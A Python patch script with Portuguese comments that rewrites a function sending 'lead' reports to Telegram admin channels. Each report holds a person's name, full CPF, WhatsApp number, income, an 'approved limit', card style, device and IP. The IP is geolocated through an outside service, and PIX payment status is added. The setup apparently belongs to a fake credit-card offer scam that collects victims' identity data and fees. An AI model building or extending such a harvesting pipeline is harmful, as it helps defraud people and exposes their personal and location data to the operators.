"""
Substitui o corpo da _send_telegram_report_inner no app.py
por uma versão limpa sem try:pass silencioso e com _rq local.
"""
with open("app.py", "r", encoding="utf-8") as f:
    content = f.read()

OLD = """    )

        \r\n    if not channel:\r\n        channel = supreme_id\r\n    if not channel and not supreme_id: return"""

# Encontra o bloco a substituir usando marcadores mais simples
START_MARKER = "def _send_telegram_report_inner(session_id, is_paid=False):\n    import requests as _rq\n\n    db = get_db()"
END_MARKER = "\ndef calc_limite"

start_idx = content.find(START_MARKER)
end_idx   = content.find(END_MARKER, start_idx)

if start_idx == -1 or end_idx == -1:
    print(f"ERRO: marcadores não encontrados. start={start_idx} end={end_idx}")
    # fallback — mostra contexto
    idx = content.find("_send_telegram_report_inner")
    print(repr(content[idx:idx+200]))
else:
    NEW_BODY = '''def _send_telegram_report_inner(session_id, is_paid=False):
    import requests as _rq

    db = get_db()
    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
    cfg = {r["key"]: r["value"] for r in cfg_rows}

    channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
    supreme_id = (
        cfg.get("admin_chat_id")
        or cfg.get("supreme_admin_id")
        or os.environ.get("SUPREME_ADMIN_ID")
        or os.environ.get("ID_ADMIN_SUPREMO")
        or os.environ.get("ADMIN_CHAT_ID")
    )

    if not channel:
        channel = supreme_id
    if not channel and not supreme_id:
        log.warning("[TG] report: sem destino (session=%s)", session_id)
        return

    thread_id = cfg.get("tg_log_thread_id")
    bot_token = (
        cfg.get("telegram_token")
        or os.environ.get("TELEGRAM_BOT_TOKEN")
        or os.environ.get("BOT_TOKEN")
    )
    if not bot_token:
        log.warning("[TG] report: sem bot_token")
        return

    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
    if not lead:
        log.warning("[TG] report: lead nao encontrado (session=%s)", session_id)
        return
    pay = db.execute(
        "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
        (session_id,)
    ).fetchone()

    status_icon = "PAGO" if is_paid else "AGUARDANDO PIX"
    import datetime
    agora = datetime.datetime.now().strftime("%d/%m/%Y as %H:%M:%S")

    geo_link = "N/A"
    if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost"]:
        try:
            ip_data = _rq.get(f"http://ip-api.com/json/{lead[\'ip\']}", timeout=2).json()
            if ip_data.get("status") == "success":
                lat, lon = ip_data.get("lat"), ip_data.get("lon")
                city, country = ip_data.get("city"), ip_data.get("country")
                geo_link = f"<a href=\'https://www.google.com/maps/search/?api=1&query={lat},{lon}\'>{city}, {country}</a>"
        except Exception:
            pass

    titulo = "NOVA VENDA CONFIRMADA!" if is_paid else "PIX GERADO COM SUCESSO!"
    texto = f"<b>{titulo}</b>\\n\\n"
    texto += (
        f"Data/Hora: {agora}\\n"
        f"Nome: {lead[\'nome\'] or \'?\'}\\n"
        f"CPF: <code>{lead[\'cpf\'] or \'?\'}</code>\\n"
    )
    if lead.get("whatsapp"):
        import re as _re
        cwa = _re.sub(r"\\D", "", lead["whatsapp"])
        texto += f"WhatsApp: <a href=\'https://wa.me/55{cwa}\'>{lead[\'whatsapp\']}</a>\\n"
    texto += (
        f"Renda: R$ {lead[\'renda\'] or \'Nao inf.\'}\\n"
        f"Limite: R$ {lead[\'limite_aprovado\'] or \'Nao inf.\'}\\n"
        f"Cartao: {lead[\'card_style\'] or \'-\'} ({lead[\'card_color\'] or \'-\'})\\n"
        f"Aparelho: {lead.get(\'device_brand\') or \'Desconhecido\'}\\n"
        f"IP: <code>{lead[\'ip\'] or \'?\'}</code> - {geo_link}\\n"
        f"Status PIX: {status_icon}\\n"
    )
    if pay:
        texto += f"Valor: R$ {pay[\'amount\']}\\n"
        texto += f"ID Pgto: <code>{pay[\'payment_id\']}</code>\\n"

    base = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}
    if channel:
        pl = dict(base, chat_id=channel)
        if thread_id:
            pl["message_thread_id"] = thread_id
        r1 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=pl, timeout=5)
        if r1.json().get("ok"):
            log.info("[TG] report canal %s OK", channel)
        else:
            log.warning("[TG] report canal erro: %s", r1.json().get("description"))
    if supreme_id and str(supreme_id) != str(channel):
        r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                      json=dict(base, chat_id=supreme_id), timeout=5)
        if r2.json().get("ok"):
            log.info("[TG] report supreme %s OK", supreme_id)
        else:
            log.warning("[TG] report supreme erro: %s", r2.json().get("description"))
'''

    new_content = content[:start_idx] + NEW_BODY + content[end_idx:]
    with open("app.py", "w", encoding="utf-8") as f:
        f.write(new_content)
    print("OK — _send_telegram_report_inner substituida com sucesso!")

import py_compile
try:
    py_compile.compile("app.py", doraise=True)
    print("OK — sem erros de sintaxe!")
except py_compile.PyCompileError as e:
    print(f"ERRO DE SINTAXE: {e}")
